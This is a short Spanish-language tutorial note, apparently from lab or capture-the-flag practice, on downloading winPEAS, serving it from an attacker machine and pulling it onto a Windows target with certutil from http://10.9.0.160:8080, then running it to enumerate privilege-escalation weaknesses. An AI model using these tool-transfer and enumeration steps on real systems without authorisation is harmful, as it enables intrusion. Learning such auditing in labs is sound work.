Es una herramienta utilizada para realizar "privilege escalation auditing" en sistemas Windows. Está diseñada para detectar configuraciones y debilidades que podrían ser explotadas para elevar privilegios en un sistema.

```
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
```

Primero descargamos el repositorio en nuestro directorio
```Bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
```
![[Pasted image 20240522113541.png]]

Arrancamos un servidor donde se encuentre el archivo WinPEAS.exe
![[Pasted image 20240522113717.png]]

Ejecutamos curl para descargarnos el fichero
```Powershell
certutil -urlcache -f http://10.9.0.160:8080/winPEASany_ofs.exe C:\Users\CyberLens\Desktop\WinPEAS.exe
```
![[Pasted image 20240605094835.png]]

Ahora ejecutamos WinPEAS
![[Pasted image 20240605095025.png]]

Ahora tendremos que analizar la información y ver que vulnerabilidades a detectado
![[Pasted image 20240605100728.png]]
![[Pasted image 20240605100824.png]]

## **Comandos WinPeas**
### **Información detallada de usuarios del sistema**
```
winPEAS.exe quiet filesinfo userinfo
```

### **Información archivos importantes**
```
winPEAS.exe quiet searchfast filesinfo
```